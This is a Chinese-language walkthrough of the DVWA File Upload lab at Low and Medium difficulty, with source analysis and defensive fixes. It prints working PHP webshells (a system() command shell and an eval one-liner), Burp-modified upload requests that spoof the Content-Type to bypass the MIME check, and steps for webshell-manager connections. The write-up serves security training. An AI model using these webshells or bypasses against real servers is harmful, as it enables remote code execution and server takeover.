# DVWA File Upload Low & Medium WriteUp

> 本文记录 DVWA 文件上传漏洞 **Low** 与 **Medium** 两个难度的通关过程，包含源码分析、手工利用、Burp Suite 改包绕过、防御措施。  
> 仅供授权测试与安全学习使用，请勿用于非法用途。

---

## 目录

- [环境说明](#环境说明)
- [Low 难度](#low-难度)
  - [源码分析](#low-源码分析)
  - [漏洞原理](#low-漏洞原理)
  - [手工利用](#low-手工利用)
  - [Burp 验证](#low-burp-验证)
  - [防御措施](#low-防御措施)
- [Medium 难度](#medium-难度)
  - [源码分析](#medium-源码分析)
  - [过滤机制](#medium-过滤机制)
  - [绕过方法](#medium-绕过方法)
  - [手工利用](#medium-手工利用)
  - [Burp 改包](#medium-burp-改包)
  - [防御措施](#medium-防御措施)
- [Low 与 Medium 对比](#low-与-medium-对比)
- [总结](#总结)

---

## 环境说明

- 靶场：DVWA
- 难度：Low / Medium
- 攻击机：Kali Linux
- 工具：Burp Suite、蚁剑 / 冰蝎、浏览器
- 靶机地址示例：`http://192.168.1.100/dvwa/`

进入 **File Upload** 模块，将安全级别分别设置为 Low 和 Medium。

---

## Low 难度

### Low 源码分析

查看 Low 级别源码：

```php
<?php
if (isset($_POST['Upload'])) {
    $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path = $target_path . basename($_FILES['uploaded']['name']);

    if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
        echo '<pre>Your image was not uploaded.</pre>';
    } else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
?>
```

关键点：

1. 使用 `basename()` 获取上传文件名，未做任何扩展名、MIME、内容校验。
2. 文件被保存到 `hackable/uploads/` 目录。
3. 该目录可通过 Web 访问，上传的 PHP 文件会直接被解析执行。
4. 没有文件大小限制。

### Low 漏洞原理

由于服务端完全信任上传文件，攻击者可以上传任意类型的文件。  
上传一个 `.php` 文件后，通过 URL 访问该文件，即可执行其中的 PHP 代码，从而获得 WebShell。

### Low 手工利用

#### 1\. 准备 WebShell

创建 `shell.php`：

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

或者使用一句话木马：

```php
<?php @eval($_POST['pass']); ?>
```

#### 2\. 上传文件

在 DVWA File Upload 页面选择 `shell.php`，点击 Upload。

页面返回类似：

```text
../../hackable/uploads/shell.php succesfully uploaded!
```

#### 3\. 访问执行

浏览器访问：

```text
http://靶机IP/dvwa/hackable/uploads/shell.php?cmd=whoami
```

如果返回当前系统用户，说明 WebShell 执行成功。

#### 4\. 使用蚁剑 / 冰蝎连接

- URL：`http://靶机IP/dvwa/hackable/uploads/shell.php`
- 密码：`pass`（对应一句话木马中的 `pass`）
- 连接成功后即可管理文件、执行命令、反弹 Shell。

### Low Burp 验证

用 Burp Suite 拦截上传请求，可以看到：

```http
POST /dvwa/vulnerabilities/upload/ HTTP/1.1
Host: 靶机IP
Content-Type: multipart/form-data; boundary=...

------WebKitFormBoundary...
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary...
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundary...--
```

服务端没有对 `Content-Type` 和 `filename` 做任何校验，直接保存。

### Low 防御措施

1. **白名单校验扩展名**  
   只允许 `jpg`、`jpeg`、`png`、`gif` 等安全扩展名。
2. **服务端验证 MIME 类型**  
   使用 `finfo_file()` 或 `mime_content_type()` 检查真实文件类型，而不是信任客户端 `Content-Type`。
3. **检查文件内容**  
   对图片文件可校验文件头魔数，例如 JPEG 的 `FF D8 FF`，PNG 的 `89 50 4E 47`。
4. **重命名文件**  
   使用随机文件名 + 安全扩展名保存，避免用户控制文件名。
5. **存储目录禁止执行**  
   将上传目录配置为不可执行 PHP，例如在 Apache 中：
   ```apache
    <Directory "/var/www/dvwa/hackable/uploads/">
        php_flag engine off
    </Directory>
   ```
6. **限制文件大小**  
   在 PHP 和 Web 服务器层面限制上传大小。

---

## Medium 难度

### Medium 源码分析

查看 Medium 级别源码：

```php
<?php
if (isset($_POST['Upload'])) {
    $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path = $target_path . basename($_FILES['uploaded']['name']);

    $uploaded_type = $_FILES['uploaded']['type'];
    $uploaded_size = $_FILES['uploaded']['size'];

    if (($uploaded_type == "image/jpeg" || $uploaded_type == "image/png") && ($uploaded_size < 100000)) {
        if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
            echo '<pre>Your image was not uploaded.</pre>';
        } else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    } else {
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
?>
```

关键点：

1. 增加了 `$uploaded_type` 和 `$uploaded_size` 检查。
2. `$uploaded_type` 来自 `$_FILES['uploaded']['type']`，即客户端请求中的 `Content-Type`。
3. 只允许 `image/jpeg` 或 `image/png`，且大小小于 `100000` 字节。
4. **没有检查文件扩展名**。
5. **没有检查文件真实内容**。
6. 客户端 `Content-Type` 可以被 Burp Suite 任意修改。

### Medium 过滤机制

Medium 的验证逻辑是：

```php
if (($uploaded_type == "image/jpeg" || $uploaded_type == "image/png") && ($uploaded_size < 100000))
```

问题在于：

- `$uploaded_type` 是客户端提交的 `Content-Type`，不是服务端检测的真实类型。
- 攻击者可以拦截请求，把 `Content-Type: application/x-php` 改为 `image/jpeg`。
- 文件名仍然可以是 `shell.php`，服务端不会检查扩展名。
- 文件大小只要小于 100000 字节即可。

因此，Medium 的防护可以被轻松绕过。

### Medium 绕过方法

#### 方法一：Burp 修改 Content-Type

1. 准备 `shell.php`：
   ```php
    <?php system($_GET['cmd']); ?>
   ```
2. 在 DVWA 页面选择该文件，点击 Upload。
3. Burp 拦截请求，找到：
   ```http
    Content-Disposition: form-data; name="uploaded"; filename="shell.php"
    Content-Type: application/x-php
   ```
4. 将 `Content-Type` 修改为：
   ```http
    Content-Type: image/jpeg
   ```
5. 转发请求，页面提示上传成功。
6. 访问：
   ```text
    http://靶机IP/dvwa/hackable/uploads/shell.php?cmd=whoami
   ```

#### 方法二：直接修改文件扩展名（不推荐）

虽然 Medium 不检查扩展名，但如果前端有 `accept` 限制，可以尝试将文件命名为 `shell.php.jpg`，但 DVWA 不会解析 `.jpg` 中的 PHP 代码，因此需要配合其他解析漏洞。  
最简单可靠的还是 Burp 修改 `Content-Type`。

### Medium 手工利用

#### 1\. 准备 WebShell

```php
<?php @eval($_POST['pass']); ?>
```

#### 2\. 上传并改包

用 Burp 拦截上传请求，修改：

```http
Content-Type: image/jpeg
```

保持文件名 `shell.php`，大小小于 100000。

#### 3\. 访问执行

```text
http://靶机IP/dvwa/hackable/uploads/shell.php
```

使用蚁剑连接：

- URL：`http://靶机IP/dvwa/hackable/uploads/shell.php`
- 密码：`pass`

### Medium Burp 改包

完整请求示例：

```http
POST /dvwa/vulnerabilities/upload/ HTTP/1.1
Host: 靶机IP
Cookie: PHPSESSID=...; security=medium
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC

------WebKitFormBoundaryABC
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryABC
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryABC--
```

关键修改点：

- `filename="shell.php"` 保持不变；
- `Content-Type: image/jpeg` 替换原来的 `application/x-php`；
- 文件内容为 PHP 代码；
- 总大小小于 100000 字节。

### Medium 防御措施

1. **服务端检测真实 MIME 类型**  
   不要使用 `$_FILES['uploaded']['type']`，应使用：
   ```php
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $real_type = finfo_file($finfo, $_FILES['uploaded']['tmp_name']);
    finfo_close($finfo);
   ```
2. **白名单校验扩展名**  
   同时检查扩展名和 MIME 类型，两者都符合才允许上传。
3. **检查文件内容**  
   对图片文件验证文件头魔数。
4. **重命名文件**  
   使用随机文件名，并强制使用安全扩展名。
5. **存储目录禁止执行**  
   上传目录配置为不可执行 PHP。
6. **限制文件大小**  
   在 PHP 和 Web 服务器层面限制上传大小。
7. **分离上传目录与 Web 根目录**  
   将上传文件存储在 Web 根目录之外，通过脚本读取后输出。

---

## Low 与 Medium 对比

| 对比项          | Low              | Medium                                   |
| --- | --- | --- |
| 扩展名验证      | 无               | 无                                       |
| MIME 验证       | 无               | 检查客户端 `Content-Type`，可伪造        |
| 文件内容验证    | 无               | 无                                       |
| 文件大小限制    | 无               | < 100000 字节                            |
| 直接上传 `.php` | 成功             | 失败（类型不符）                         |
| 绕过方式        | 无需绕过         | Burp 修改 `Content-Type` 为 `image/jpeg` |
| 根本问题        | 完全信任用户输入 | 信任客户端 MIME，未验证真实类型          |

---

## 总结

- **Low**：没有任何验证，直接上传 `.php` 文件即可获得 WebShell。
- **Medium**：增加了客户端 MIME 和大小检查，但 MIME 来自请求头，可被 Burp 篡改；文件名仍可保持 `.php`，因此绕过非常简单。
- **核心教训**：文件上传的安全验证必须在服务端完成，不能信任客户端提交的任何信息。正确做法是白名单扩展名 + 服务端真实 MIME 检测 + 文件内容校验 + 重命名 + 存储目录禁止执行。

> 本文仅用于 DVWA 靶场学习与授权测试，请遵守法律法规。